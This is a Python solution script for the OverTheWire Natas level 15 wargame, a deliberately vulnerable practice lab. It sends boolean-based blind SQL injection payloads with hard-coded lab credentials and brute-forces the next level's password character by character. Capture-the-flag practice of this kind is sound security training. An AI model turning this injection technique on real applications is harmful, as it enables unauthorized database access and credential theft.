import requests
from requests.auth import HTTPBasicAuth
import natas14solution

def get_pass(dat):
    auth = HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
    r = requests.post('http://natas15.natas.labs.overthewire.org/', auth=auth, data=dat)
    return r.text 
def check_exists(webcontent):
    if webcontent.find('This user exists.') != -1:
        return 1
    else:
        return 0
if __name__ == "__main__":
    alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    test = alphabet[0]
    complete_pass = ''
    print('Trying: ' + test)
    for i in range(32):
        count = 0
        test = alphabet[count]
        check = check_exists(get_pass({'username':'natas16" and password like binary \'' + complete_pass + test + '%\' # '}))
        while check == 0:
            count += 1
            test = alphabet[count]
            check =  check_exists(get_pass({'username':'natas16" and password like binary \'' + complete_pass + test  + '%\' #'}))
            print('Trying: ' + test)
        complete_pass += test
        print('Found: ' + test + '\nPassword: ' + complete_pass)

    
